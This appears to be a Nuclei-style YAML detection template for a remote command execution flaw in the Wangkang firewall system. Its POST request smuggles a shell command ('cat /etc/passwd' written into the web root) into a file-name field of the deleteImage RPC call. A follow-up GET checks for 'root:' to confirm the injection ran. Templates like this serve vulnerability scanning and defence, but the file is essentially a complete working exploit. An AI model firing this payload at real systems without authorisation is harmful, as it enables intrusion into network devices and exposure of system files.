id: wangkang-firewall-rce
info:
  name: 旺客防火墙系统远程命令执行漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce

http:
  - id: execute-command
    method: POST
    path:
      - "{{BaseURL}}/directdata/direct/router"
    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
      Content-Type: application/json;charset=UTF-8
    body: |
      {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/justformytest.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
    matchers:
      - type: dsl
        dsl:
          - contains(http_body, '\"result\":{\"success\":true}')

  - id: validate-command
    method: GET
    path:
      - "{{BaseURL}}/justformytest.txt"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root:"
      - type: word
        words:
          - "/bin"
      - type: word
        words:
          - "<!DOCTYPE"
        negative: true
